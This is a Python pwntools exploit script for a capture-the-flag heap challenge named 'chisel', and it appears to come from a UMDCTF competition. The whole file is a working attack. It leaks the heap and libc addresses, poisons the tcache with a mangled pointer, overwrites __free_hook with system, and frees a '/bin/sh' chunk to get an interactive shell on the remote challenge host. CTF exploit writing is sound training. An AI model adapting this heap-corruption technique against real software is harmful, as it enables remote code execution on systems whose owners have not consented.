#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chisel'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challs.umdctf.io', 31447

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chisel
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def alloc(size):
    log.info('ALLOC[%#x]', size)
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'size:', str(size).encode())  

def free():
    io.sendlineafter(b'>', b'2')

def edit(data: int):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'data:', str(data).encode())

def read() -> int:
    io.sendlineafter(b'>', b'4')
    io.recvuntil(b'data: ')
    return int(io.recvline().strip())

def chisel():
    io.sendlineafter(b'>', b'5')

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    BASE_SIZE = 0x418

    alloc(0x10)
    free()
    heap = read() << 12
    alloc(0x10)

    for i in range(1, 4):
        alloc(BASE_SIZE + (i * 0x20))
        chisel()
        free()
    libc.address = read() - 0x1e0c00

    # smallbins
    # 0x20: 0x564324bd19b0 —▸ 0x564324bd1030 —▸ 0x564324bd06d0 —▸ 0x7fd450556c10 ◂— 0x564324bd19b0
    for i in range(0, 3):
        alloc(BASE_SIZE + (i * 0x20))

    # tcachebins
    # 0x20 [  2]: 0x564324bd19c0 —▸ 0x564324bd1040 ◂— 0x0
    alloc(0x10)
    free()

    hook = mangle(heap, libc.sym['__free_hook'])
    edit(hook)

    alloc(0x10)
    alloc(0x10)
    edit(libc.sym['system'])

    alloc(0x40)
    edit(0x0068732f6e69622f)    # /bin/sh
    free()                      # trigger system

    log.success('heap base: %#x', heap)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()